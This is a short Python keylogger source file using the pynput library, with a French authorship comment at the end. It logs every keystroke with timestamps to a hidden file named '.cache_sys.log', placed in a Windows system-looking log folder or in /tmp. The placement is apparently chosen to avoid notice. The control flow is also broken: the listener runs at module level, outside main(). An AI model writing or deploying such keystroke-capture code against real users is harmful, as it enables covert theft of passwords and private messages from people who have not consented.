import os
import sys
import datetime

from pynput import keyboard
from pathlib import Path


# the function that gets the path of environment variable --APPDATA--
def get_path_log():
    if sys.platform.startswith('win'):
        base = Path(os.getenv('APPDATA', str(Path.home())))
        directory = base / 'Microsoft' / 'Windows' / 'Logs'
    elif sys.platform.startswith('linux'):
        directory = Path('/tmp')
    else:
        directory = Path.home()

    directory.mkdir(parents=True, exist_ok=True)
    return directory / '.cache_sys.log'


# the function that writes inside the logs file
def write_in_log_file(text):
    path_env = get_path_log()
    now = datetime.datetime.now()
    formated = now.strftime('%d-%m-%Y %H:%M:%S')

    with open(path_env, 'a', encoding='utf-8') as f:
        f.write(f'[{formated}] {text}\n')


# the function that gets any key pressed on the keyboard
def on_press(key):
    try:
        write_in_log_file(key.char)
    except AttributeError:
        write_in_log_file(f'[{key.name.upper()}]')


# the function that stop the listener of keyboard
def on_release(key):
    if key == keyboard.Key.esc:
        write_in_log_file('=== SESSION STOPPED ===')
        return False


# the function main that launches the program
def main():
    print('[+] Keyboard started')
    print('[+] Press ESC to stop')
    write_in_log_file('=== NEW SESSION ===')


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print('[+] Stopped properly')


if __name__ == "__main__":
    main()

# CE CODE EST ECRIT DU DEBUT JUSQU'A LA FIN PAR L'INGENIEUR
# HERITIER RAMAZANI CHRISTIAN, LICENCIE EN INFO-UPL-LU'SHI
